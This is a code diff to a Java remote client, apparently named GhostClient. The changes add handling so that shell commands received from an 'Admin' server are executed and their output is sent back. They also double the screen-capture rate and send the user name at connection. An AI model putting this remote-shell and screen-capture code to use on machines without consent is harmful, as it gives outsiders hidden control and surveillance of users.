@@ -45,6 +45,11 @@ public class GhostClient {
 
                     System.out.println("Connected to Admin!");
 
+                    // Notify UI of connection
+                    if (listener != null) {
+                        listener.onCommand(new CommandPacket(CommandPacket.Type.NOTIFICATION, "SYSTEM", "CONNECTED"));
+                    }
+
                     // Send Initial Handshake
                     CommandPacket verify = new CommandPacket(CommandPacket.Type.CONNECT,
                             System.getProperty("user.name"), "{}");
@@ -115,7 +120,7 @@ public class GhostClient {
                 } catch (Exception e) {
                 }
             }
-        }, 100, 100, TimeUnit.MILLISECONDS); // 10fps to reduce flicker
+        }, 50, 50, TimeUnit.MILLISECONDS); // 20fps for smoother display
     }
 
     private void stopScreenCapture() {
@@ -170,10 +175,21 @@ public class GhostClient {
                     }
                     break;
                 case SHELL:
-                    // Execute shell command from admin
+                    // Execute shell command from admin and send output back
                     String cmd = packet.getPayload();
                     if (cmd != null && !cmd.isEmpty()) {
-                        PythonBridge.execute(cmd);
+                        String clientName = System.getProperty("user.name");
+                        PythonBridge.executeWithCallback(cmd, output -> {
+                            // Send output back to admin
+                            if (out != null) {
+                                String response = clientName + " > " + cmd + "\n" + output;
+                                CommandPacket outputPacket = new CommandPacket(
+                                        CommandPacket.Type.SHELL_OUTPUT,
+                                        clientName,
+                                        response);
+                                out.println(gson.toJson(outputPacket));
+                            }
+                        });
                     }
                     break;
                 case MSG:
